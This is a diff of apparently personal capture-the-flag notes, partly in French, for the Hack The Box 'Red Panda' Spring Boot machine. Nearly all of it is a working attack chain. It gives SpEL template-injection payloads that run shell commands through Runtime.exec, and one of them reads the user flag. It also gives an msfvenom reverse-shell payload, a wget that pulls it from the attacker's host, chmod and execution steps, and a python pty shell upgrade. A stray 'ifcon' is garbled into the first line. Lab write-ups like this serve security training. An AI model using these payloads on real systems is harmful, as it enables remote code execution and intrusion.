@@ -1,4 +1,4 @@
-# 10.10.11.170
+ifcon# 10.10.11.170
 
 # Red Panda Search | Made with Spring Boot
 # SSTI
@@ -134,3 +134,25 @@ http://10.10.11.170:8080/stats?author=
 
 # flag user.txt
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /home/woodenk/user.txt').getInputStream())}
+
+#get shel ssti
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('./exploit.elf').getInputStream())}
+
+# payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST= votre IP LPORT=4444 -f elf > ~/Desktop/shelf.elf
+
+# download
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget http://10.10.14.13/Desktop/exploit.elf').getInputStream())}
+
+# chmod
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod 777 exploit.elf').getInputStream())}
+
+# lancement
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('./exploit.elf').getInputStream())}
+
+# shell interactif
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+# pwd interessant
+/opt/panda_search/src/main/java/com/panda_search/htb/panda_search
